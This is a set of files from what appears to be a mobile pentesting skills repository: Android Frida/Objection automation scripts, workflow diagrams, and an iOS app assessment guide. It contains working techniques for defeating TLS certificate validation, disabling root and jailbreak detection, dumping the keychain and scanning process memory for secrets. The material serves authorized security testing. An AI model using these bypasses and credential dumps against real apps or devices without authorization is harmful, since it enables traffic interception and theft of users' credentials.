| MASTG-TEST-0038 | Testing Anti-Debugging | ptrace hooks, Frida detection |

## CWE Mappings

| CWE ID | Title | Dynamic Detection |
|--------|-------|-------------------|
| CWE-312 | Cleartext Storage | Memory search for plaintext secrets |
| CWE-319 | Cleartext Transmission | Network method hooking |
| CWE-327 | Broken Crypto Algorithm | Cipher.getInstance() hooking |
| CWE-489 | Active Debug Code | Debug flag detection at runtime |
| CWE-693 | Protection Mechanism Failure | Root/tamper detection bypass |

===== END FILE =====


===== FILE: skills/performing-dynamic-analysis-of-android-app/references/workflows.md =====
# Workflows: Dynamic Analysis of Android App

## Workflow 1: Complete Android Dynamic Assessment

```
[Setup Frida Server] --> [Enumerate app surface] --> [Hook sensitive methods]
                                                            |
                                             +--------------+--------------+
                                             |              |              |
                                      [Auth hooks]   [Crypto hooks]  [Network hooks]
                                      [Login flow]   [Cipher ops]    [API calls]
                                      [Token mgmt]   [Key generation] [URL requests]
                                             |              |              |
                                             +--------------+--------------+
                                                            |
                                                     [Root detection test]
                                                     [Tamper detection test]
                                                     [Debug detection test]
                                                            |
                                                     [Memory/heap analysis]
                                                     [Extract runtime secrets]
                                                            |
                                                     [Document findings]
```

## Workflow 2: Protection Bypass Pipeline

```
[App refuses to run] --> [Identify protection]
                               |
              +----------------+----------------+
              |                |                |
       [Root detection]  [Frida detection]  [Emulator detection]
              |                |                |
       [File checks?]   [Port scan?]      [Build.prop?]
       [su binary?]     [Memory scan?]    [IMEI check?]
       [RootBeer?]      [Process name?]   [Sensor data?]
              |                |                |
       [Bypass script]  [Custom Frida]    [Prop override]
              |                |                |
              +----------------+----------------+
                               |
                        [Verify bypass works]
                        [Continue assessment]
```

## Decision Matrix: Hooking Strategy

| Scenario | Tool | Approach |
|----------|------|----------|
| Quick reconnaissance | Objection | `android hooking watch class` |
| Specific method analysis | Frida script | Custom JavaScript hook |
| Crypto algorithm discovery | frida-trace | Auto-trace javax.crypto.* |
| Memory forensics | Objection | `memory search` / `memory dump` |
| IPC testing | Drozer | Module-based component testing |
| Network analysis | Frida + Burp | Hook + proxy combination |

===== END FILE =====


===== FILE: skills/performing-dynamic-analysis-of-android-app/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for performing dynamic analysis of Android applications using Frida."""

import json
import argparse
import subprocess

try:
    import frida
    HAS_FRIDA = True
except ImportError:
    HAS_FRIDA = False


def list_packages(device_id=None):
    """List installed packages on Android device/emulator."""
    cmd = ["adb"] + (["-s", device_id] if device_id else []) + ["shell", "pm", "list", "packages", "-3"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    packages = [l.replace("package:", "").strip() for l in result.stdout.strip().split("\n") if l.strip()]
    return {"total": len(packages), "packages": packages}


def capture_network_traffic(device_id=None, duration=30, output="capture.pcap"):
    """Capture network traffic from Android device using tcpdump."""
    adb = ["adb"] + (["-s", device_id] if device_id else [])
    subprocess.run(adb + ["shell", "tcpdump", "-i", "any", "-w", f"/sdcard/{output}", "-G", str(duration), "-W", "1"],
                   timeout=duration + 10, capture_output=True)
    subprocess.run(adb + ["pull", f"/sdcard/{output}", output], capture_output=True, timeout=15)
    return {"output": output, "duration": duration}


def check_ssl_pinning(package_name, device_id=None):
    """Check if app implements SSL/TLS certificate pinning using Frida."""
    if not HAS_FRIDA:
        return {"error": "frida not installed"}
    device = frida.get_usb_device() if not device_id else frida.get_device(device_id)
    pid = device.spawn([package_name])
    session = device.attach(pid)
    script = session.create_script("""
    Java.perform(function() {
        var results = {pinning_detected: false, methods: []};
        try {
            var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
            TrustManagerImpl.verifyChain.implementation = function() {
                results.pinning_detected = true;
                results.methods.push('TrustManagerImpl.verifyChain');
                return arguments[0];
            };
        } catch(e) {}
        try {
            var OkHostnameVerifier = Java.use('okhttp3.internal.tls.OkHostnameVerifier');
            OkHostnameVerifier.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession').implementation = function() {
                results.pinning_detected = true;
                results.methods.push('OkHostnameVerifier.verify');
                return true;
            };
        } catch(e) {}
        setTimeout(function() { send(results); }, 5000);
    });
    """)
    results = {}
    def on_message(msg, data):
        nonlocal results
        if msg["type"] == "send":
            results = msg["payload"]
    script.on("message", on_message)
    script.load()
    device.resume(pid)
    import time
    time.sleep(8)
    session.detach()
    return {"package": package_name, "ssl_pinning": results}


def analyze_exported_components(package_name, device_id=None):
    """List exported activities, services, receivers, and providers."""
    adb = ["adb"] + (["-s", device_id] if device_id else [])
    result = subprocess.run(
        adb + ["shell", "dumpsys", "package", package_name],
        capture_output=True, text=True, timeout=15
    )
    output = result.stdout
    components = {"activities": [], "services": [], "receivers": [], "providers": []}
    section = None
    for line in output.split("\n"):
        line = line.strip()
        if "Activity Resolver Table:" in line:
            section = "activities"
        elif "Service Resolver Table:" in line:
            section = "services"
        elif "Receiver Resolver Table:" in line:
            section = "receivers"
        elif "Provider Resolver Table:" in line:
            section = "providers"
        elif section and package_name in line:
            components[section].append(line[:200])
    return {"package": package_name, "components": components}


def check_data_storage(package_name, device_id=None):
    """Check for insecure data storage patterns."""
    adb = ["adb"] + (["-s", device_id] if device_id else [])
    findings = []
    # Check shared preferences for sensitive data
    sp_result = subprocess.run(
        adb + ["shell", "run-as", package_name, "ls", "shared_prefs/"],
        capture_output=True, text=True, timeout=10
    )
    if sp_result.returncode == 0:
        prefs = [f.strip() for f in sp_result.stdout.split("\n") if f.strip()]
        findings.append({"type": "shared_prefs", "files": prefs})
    # Check for world-readable files
    wr_result = subprocess.run(
        adb + ["shell", "run-as", package_name, "find", ".", "-perm", "-o+r", "-type", "f"],
        capture_output=True, text=True, timeout=10
    )
    if wr_result.stdout.strip():
        findings.append({"type": "world_readable", "files": wr_result.stdout.strip().split("\n")[:20]})
    return {"package": package_name, "findings": findings}


def main():
    parser = argparse.ArgumentParser(description="Android Dynamic Analysis Agent")
    parser.add_argument("--device", help="ADB device ID")
    sub = parser.add_subparsers(dest="command")
    sub.add_parser("packages", help="List third-party packages")
    s = sub.add_parser("ssl", help="Check SSL pinning")
    s.add_argument("--package", required=True)
    c = sub.add_parser("components", help="Analyze exported components")
    c.add_argument("--package", required=True)
    d = sub.add_parser("storage", help="Check data storage security")
    d.add_argument("--package", required=True)
    n = sub.add_parser("network", help="Capture network traffic")
    n.add_argument("--duration", type=int, default=30)
    args = parser.parse_args()
    if args.command == "packages":
        result = list_packages(args.device)
    elif args.command == "ssl":
        result = check_ssl_pinning(args.package, args.device)
    elif args.command == "components":
        result = analyze_exported_components(args.package, args.device)
    elif args.command == "storage":
        result = check_data_storage(args.package, args.device)
    elif args.command == "network":
        result = capture_network_traffic(args.device, args.duration)
    else:
        parser.print_help()
        return
    print(json.dumps(result, indent=2, default=str))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-dynamic-analysis-of-android-app/scripts/process.py =====
#!/usr/bin/env python3
"""
Android Dynamic Analysis Automation

Automates common Frida/Objection dynamic analysis tasks on Android applications.
Enumerates attack surface, hooks sensitive methods, and extracts runtime data.

Usage:
    python process.py --package com.target.app [--device-id DEVICE] [--output report.json]
"""

import argparse
import json
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path


class AndroidDynamicAnalyzer:
    """Automates Android dynamic analysis using Frida and Objection."""

    def __init__(self, package: str, device_id: str = None):
        self.package = package
        self.device_id = device_id
        self.findings = []

    def _adb(self, cmd: str, timeout: int = 15) -> str:
        """Run ADB command."""
        full_cmd = ["adb"]
        if self.device_id:
            full_cmd.extend(["-s", self.device_id])
        full_cmd.extend(["shell"] + cmd.split())
        try:
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
            return result.stdout.strip()
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return ""

    def _objection(self, cmd: str, timeout: int = 20) -> str:
        """Run Objection command."""
        full_cmd = ["objection", "--gadget", self.package, "run", cmd]
        try:
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
            return result.stdout + result.stderr
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return ""

    def _frida_script(self, script: str, timeout: int = 15) -> str:
        """Execute Frida JavaScript snippet."""
        cmd = ["frida", "-U", "-n", self.package, "-e", script, "--no-pause"]
        if self.device_id:
            cmd.extend(["-D", self.device_id])
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return result.stdout
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return ""

    def check_frida_server(self) -> bool:
        """Verify Frida server is running on device."""
        try:
            result = subprocess.run(
                ["frida-ps", "-U"] + (["-D", self.device_id] if self.device_id else []),
                capture_output=True, text=True, timeout=10
            )
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def enumerate_components(self) -> dict:
        """Enumerate app exported components."""
        activities = self._objection("android hooking list activities")
        services = self._objection("android hooking list services")
        receivers = self._objection("android hooking list receivers")

        components = {
            "activities": [l.strip() for l in activities.split("\n") if l.strip() and not l.startswith("[")],
            "services": [l.strip() for l in services.split("\n") if l.strip() and not l.startswith("[")],
            "receivers": [l.strip() for l in receivers.split("\n") if l.strip() and not l.startswith("[")],
        }

        self.findings.append({
            "check": "component_enumeration",
            "category": "MASVS-PLATFORM",
            "total_activities": len(components["activities"]),
            "total_services": len(components["services"]),
            "total_receivers": len(components["receivers"]),
            "severity": "INFO",
        })
        return components

    def test_root_detection(self) -> dict:
        """Test root detection implementation."""
        output = self._objection("android root disable")
        detection_found = "hook" in output.lower() or "bypass" in output.lower()

        finding = {
            "check": "root_detection",
            "category": "MASVS-RESILIENCE",
            "owasp_mobile": "M7",
            "detection_present": detection_found,
            "bypass_successful": detection_found,
            "severity": "MEDIUM" if not detection_found else "INFO",
            "description": "Root detection " + ("found and bypassed" if detection_found else "not implemented"),
        }
        self.findings.append(finding)
        return finding

    def test_ssl_pinning(self) -> dict:
        """Test SSL certificate pinning."""
        output = self._objection("android sslpinning disable")
        pinning_found = "hook" in output.lower()

        finding = {
            "check": "ssl_pinning",
            "category": "MASVS-NETWORK",
            "owasp_mobile": "M5",
            "pinning_present": pinning_found,
            "severity": "MEDIUM" if not pinning_found else "INFO",
            "description": "SSL pinning " + ("detected" if pinning_found else "not detected"),
        }
        self.findings.append(finding)
        return finding

    def search_memory_secrets(self) -> dict:
        """Search process memory for sensitive strings."""
        patterns = ["password", "api_key", "secret", "Bearer ", "eyJ"]
        memory_hits = []

        for pattern in patterns:
            output = self._objection(f'memory search "{pattern}" --string')
            if "Found" in output:
                count = output.count("Found")
                memory_hits.append({"pattern": pattern, "matches": count})

        finding = {
            "check": "memory_secrets",
            "category": "MASVS-STORAGE",
            "owasp_mobile": "M9",
            "patterns_found": len(memory_hits),
            "details": memory_hits,
            "severity": "HIGH" if memory_hits else "PASS",
        }
        self.findings.append(finding)
        return finding

    def check_debug_mode(self) -> dict:
        """Check if app is running in debuggable mode."""
        output = self._adb(f"run-as {self.package} id")
        debuggable = "uid=" in output

        # Also check via package info
        pkg_info = self._adb(f"dumpsys package {self.package}")
        flag_debuggable = "FLAG_DEBUGGABLE" in pkg_info

        finding = {
            "check": "debug_mode",
            "category": "MASVS-RESILIENCE",
            "owasp_mobile": "M8",
            "run_as_works": debuggable,
            "flag_debuggable": flag_debuggable,
            "severity": "HIGH" if flag_debuggable else "PASS",
            "description": "App " + ("IS" if flag_debuggable else "is NOT") + " flagged as debuggable",
        }
        self.findings.append(finding)
        return finding

    def dump_keystore(self) -> dict:
        """Dump Android Keystore entries."""
        output = self._objection("android keystore list")

        finding = {
            "check": "keystore_dump",
            "category": "MASVS-CRYPTO",
            "owasp_mobile": "M10",
            "output": output[:2000],
            "severity": "INFO",
        }
        self.findings.append(finding)
        return finding

    def generate_report(self) -> dict:
        """Generate assessment report."""
        severity_counts = {}
        for f in self.findings:
            sev = f.get("severity", "INFO")
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

        return {
            "assessment": {
                "target": self.package,
                "type": "Android Dynamic Analysis",
                "date": datetime.now().isoformat(),
                "tools": ["Frida", "Objection", "ADB"],
            },
            "summary": {
                "total_checks": len(self.findings),
                "severity_breakdown": severity_counts,
            },
            "findings": self.findings,
        }


def main():
    parser = argparse.ArgumentParser(description="Android Dynamic Analysis Automation")
    parser.add_argument("--package", required=True, help="Target package name")
    parser.add_argument("--device-id", help="ADB device serial")
    parser.add_argument("--output", default="dynamic_analysis.json", help="Output report")
    args = parser.parse_args()

    analyzer = AndroidDynamicAnalyzer(args.package, args.device_id)

    if not analyzer.check_frida_server():
        print("[-] Frida server not reachable. Ensure it's running on the device.")
        sys.exit(1)

    print(f"[+] Starting dynamic analysis of {args.package}")

    print("[*] Enumerating components...")
    analyzer.enumerate_components()

    print("[*] Testing root detection...")
    analyzer.test_root_detection()

    print("[*] Testing SSL pinning...")
    analyzer.test_ssl_pinning()

    print("[*] Checking debug mode...")
    analyzer.check_debug_mode()

    print("[*] Searching memory for secrets...")
    analyzer.search_memory_secrets()

    print("[*] Dumping keystore...")
    analyzer.dump_keystore()

    report = analyzer.generate_report()
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)

    print(f"\n[+] Report saved: {args.output}")
    print(f"[*] Findings: {report['summary']['severity_breakdown']}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-ios-app-security-assessment/SKILL.md =====
---
name: performing-ios-app-security-assessment
description: 'Performs comprehensive iOS application security assessments using Frida
  for dynamic instrumentation, Objection for runtime exploration, SSL pinning bypass
  for traffic interception, keychain extraction for credential analysis, and IPA static
  analysis for binary-level review. Use when conducting authorized iOS penetration
  tests, evaluating mobile app security posture against OWASP MASTG, or assessing
  iOS app data protection and transport security controls. Activates for requests
  involving iOS app pentesting, Frida-based iOS instrumentation, mobile app SSL pinning
  bypass, or IPA reverse engineering.

  '
domain: cybersecurity
subdomain: mobile-security
author: mukul975
tags:
- mobile-security
- ios
- frida
- objection
- ssl-pinning
- keychain
- ipa-analysis
- owasp-mastg
version: 1.0.0
license: Apache-2.0
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1059
- T1056
- T1036
- T1078
- T1003
---
# Performing iOS App Security Assessment

## Disclaimer

This skill is intended for authorized security testing, penetration testing engagements, CTF competitions, and educational purposes only. Unauthorized access to applications or devices is illegal. Always obtain written authorization before performing any security assessment. Misuse of these techniques may violate computer fraud and abuse laws in your jurisdiction.

## When to Use

Use this skill when:
- Conducting authorized penetration tests of iOS applications against OWASP MASVS/MASTG criteria
- Performing dynamic analysis of iOS apps using Frida instrumentation and Objection runtime exploration
- Bypassing SSL/TLS certificate pinning to intercept and analyze app network traffic through a proxy
- Extracting and auditing iOS Keychain contents for insecure credential storage practices
- Performing static analysis of IPA packages to identify hardcoded secrets, entitlements, and binary protections
- Assessing jailbreak detection and anti-tampering controls in iOS applications

**Do not use** against applications without explicit written authorization. Do not use on production devices containing real user data unless the engagement scope permits it.

## Prerequisites

- Python 3.10+ with pip
- Frida toolkit: `pip install frida-tools frida`
- Objection: `pip install objection`
- Target iOS device (jailbroken with frida-server, or non-jailbroken with patched IPA)
- macOS with Xcode command-line tools (recommended for code signing and ideviceinstaller)
- Burp Suite or mitmproxy for traffic interception after SSL pinning bypass
- For jailbroken devices: SSH access and frida-server running on the device
- For non-jailbroken devices: Apple Developer certificate for IPA re-signing

## Workflow

### Step 1: IPA Static Analysis

Extract and analyze the IPA binary before runtime testing:

```bash
# Unzip IPA for static analysis
unzip target.ipa -d target_app/

# Check binary architectures and protections
otool -hv target_app/Payload/*.app/AppExecutable
otool -l target_app/Payload/*.app/AppExecutable | grep -A4 LC_ENCRYPTION

# Extract Info.plist for entitlements and URL schemes
plutil -p target_app/Payload/*.app/Info.plist

# Search for hardcoded secrets in binary strings
strings target_app/Payload/*.app/AppExecutable | grep -iE "api[_-]?key|secret|password|token|firebase"

# Check embedded provisioning profile
security cms -D -i target_app/Payload/*.app/embedded.mobileprovision

# Identify linked frameworks
otool -L target_app/Payload/*.app/AppExecutable
```

### Step 2: Environment Setup and Frida Attachment

```bash
# For jailbroken device: verify Frida server is running
frida-ps -U

# Spawn target app with Frida
frida -U -f com.target.app --no-pause

# For non-jailbroken device: patch IPA with Frida Gadget
objection patchipa --source target.ipa --codesign-signature "Apple Development: tester@example.com"

# Install patched IPA
ideviceinstaller -i target-patched.ipa

# Attach Objection to running app
objection --gadget "com.target.app" explore
```

### Step 3: SSL Pinning Bypass

Bypass certificate pinning to enable traffic interception:

```bash
# Using Objection's built-in bypass
objection --gadget "com.target.app" explore --startup-command "ios sslpinning disable"

# Using Frida script for more comprehensive bypass
frida -U -f com.target.app -l ssl_pinning_bypass.js --no-pause

# Verify bypass by configuring device proxy to Burp Suite
# Device Settings -> Wi-Fi -> HTTP Proxy -> Manual -> <burp_ip>:8080
# Install Burp CA certificate on device via http://<burp_ip>:8080/cert
```

The Frida SSL pinning bypass script hooks into NSURLSession, NSURLConnection, and
AFNetworking/Alamofire trust evaluation delegates to override certificate validation
at the TLS handshake level.

### Step 4: Keychain Extraction and Credential Analysis

```bash
# Dump all accessible keychain items via Objection
ios keychain dump

# Dump keychain with raw data output
ios keychain dump --json

# Check keychain item accessibility attributes
# Items with kSecAttrAccessibleAlways or kSecAttrAccessibleAfterFirstUnlock
# are accessible without device unlock - this is a finding

# Search for specific credential types
ios keychain dump | grep -i "password\|token\|secret\|oauth"

# Inspect NSUserDefaults for sensitive data leaks
ios nsuserdefaults get

# Check for sensitive data in app cookies
ios cookies get
```

### Step 5: Runtime Method Hooking and Analysis

```bash
# List all loaded classes
ios hooking list classes

# Search for security-relevant classes
ios hooking search classes Auth
ios hooking search classes Crypto
ios hooking search classes Biometric
ios hooking search classes Jailbreak

# Hook authentication methods to observe parameters and return values
ios hooking watch method "+[AuthManager validateCredentials:password:]" --dump-args --dump-return

# Monitor biometric authentication (LocalAuthentication framework)
ios hooking watch class LAContext

# Bypass jailbreak detection
ios jailbreak disable

# Search memory for sensitive strings
memory search "Bearer " --string
memory search "password" --string

# Dump loaded modules for third-party library identification
memory list modules
```

### Step 6: Data Storage Assessment

```bash
# List files in app sandbox
env

# Check for SQLite databases with sensitive data
sqlite connect Documents/app.db
sqlite execute query "SELECT name FROM sqlite_master WHERE type='table'"

# Inspect plist files for cached credentials
ios plist cat Library/Preferences/com.target.app.plist

# Check for sensitive data in app caches
find Library/Caches/ -type f

# Monitor pasteboard for credential leakage
ios pasteboard monitor

# Check binary cookies
ios cookies get
```

### Step 7: Network and Transport Security Assessment

After SSL pinning bypass, analyze intercepted traffic:

```bash
# Verify App Transport Security (ATS) configuration in Info.plist
# Check for NSAllowsArbitraryLoads = true (disables ATS)
ios plist cat Info.plist | grep -A5 NSAppTransportSecurity

# Hook URL session delegates to monitor all network calls
ios hooking watch class NSURLSession
ios hooking watch class NSURLSessionConfiguration

# Check for certificate transparency validation
ios hooking search classes CT
ios hooking search classes Certificate
```

## Key Concepts

| Term | Definition |
|------|-----------|
| **Frida** | Dynamic instrumentation toolkit that injects a JavaScript engine into target processes, enabling runtime hooking, tracing, and modification of iOS app behavior |
| **Objection** | Runtime mobile exploration toolkit built on Frida providing pre-built commands for common security tests including keychain dump, SSL pinning bypass, and method hooking |
| **SSL Pinning** | Client-side certificate validation that restricts which TLS certificates the app trusts, preventing proxy-based traffic interception; bypassed by hooking trust evaluation functions |
| **Keychain** | iOS secure storage API for credentials and tokens; items have accessibility attributes that control when they can be read (e.g., only when device is unlocked) |
| **IPA** | iOS App Store Package; a ZIP archive containing the app binary, frameworks, assets, and provisioning profile that can be extracted for static analysis |
| **OWASP MASTG** | Mobile Application Security Testing Guide; comprehensive methodology for iOS and Android security testing organized by MASVS verification categories |
| **Frida Gadget** | Shared library (.dylib) injected into IPA for non-jailbroken testing; enables Frida instrumentation without requiring a jailbroken device |
| **Method Swizzling** | Objective-C runtime technique that exchanges method implementations at runtime; used by Frida to intercept and modify method behavior |

## Tools & Systems

- **Frida**: Dynamic instrumentation framework for injecting JavaScript into native app processes at runtime
- **Objection**: High-level Frida-powered mobile security toolkit with pre-built exploration commands
- **frida-tools**: CLI utilities including frida-ps (process listing), frida-trace (method tracing), frida-discover (API discovery)
- **Burp Suite**: HTTP/HTTPS interception proxy used to analyze app traffic after SSL pinning bypass
- **ideviceinstaller**: Cross-platform CLI tool for installing and managing iOS apps over USB
- **otool / rabin2**: Binary analysis tools for inspecting Mach-O headers, linked libraries, and encryption info
- **Cycript / Frida REPL**: Interactive consoles for exploring Objective-C runtime and modifying objects in memory

## Common Pitfalls

- **Frida detection crashes the app**: Some apps implement Frida detection by scanning for frida-server process names, Frida's RPC ports, or gadget signatures. Use `--startup-command` to hook detection checks before they execute, or rename frida-server binary.
- **Keychain scope limitation**: Objection can only access keychain items within the app's keychain access group. System-wide keychain items require jailbreak-level tools like keychain-dumper.
- **Swift name mangling**: Swift method names are mangled in the Objective-C runtime. Use `ios hooking list classes` and grep for demangled names, or use frida-trace with wildcard patterns.
- **App Transport Security enforcement**: ATS may block your proxy connections even after SSL pinning bypass. Verify the Info.plist ATS configuration allows your proxy's certificate chain.
- **Code signing invalidation**: Patching an IPA with Frida Gadget invalidates the original code signature. You need a valid Apple Developer certificate to re-sign the patched IPA.
- **Non-persistent modifications**: All Frida/Objection hooks are runtime-only and reset when the app restarts. Document findings and capture evidence immediately.

## Output Format

```
## Finding: Insecure Keychain Storage with kSecAttrAccessibleAlways

**ID**: IOS-001
**Severity**: High (CVSS 7.5)
**OWASP MASTG**: MASTG-TEST-0055 (Testing Data Storage)
**MASVS Category**: MASVS-STORAGE

**Description**:
The application stores OAuth refresh tokens in the iOS Keychain with
the accessibility attribute kSecAttrAccessibleAlways, making them
readable even when the device is locked or after a reboot without
user authentication.

**Proof of Concept**:
1. Attach Objection to com.target.app: objection --gadget com.target.app explore
2. Execute: ios keychain dump
3. Observe refresh_token item with Accessible: kSecAttrAccessibleAlways
4. Token value is accessible without device unlock

**Impact**:
An attacker with physical access to a locked device or forensic
image can extract OAuth refresh tokens and gain persistent access
to the user's account without knowing device passcode.

**Remediation**:
Store sensitive credentials with kSecAttrAccessibleWhenUnlockedThisDeviceOnly
and enable biometric protection via kSecAccessControlBiometryCurrentSet.
```

===== END FILE =====


===== FILE: skills/performing-ios-app-security-assessment/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-ios-app-security-assessment/references/api-reference.md =====
# API Reference: iOS App Security Assessment Agent

## Overview

Automates iOS application security testing using Frida dynamic instrumentation, Objection runtime exploration, SSL pinning bypass, keychain extraction, and IPA static analysis. Covers OWASP MASVS categories including STORAGE, NETWORK, AUTH, RESILIENCE, and PLATFORM. For authorized penetration testing only.

## Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| frida | >=16.0 | Dynamic instrumentation framework for iOS process injection |
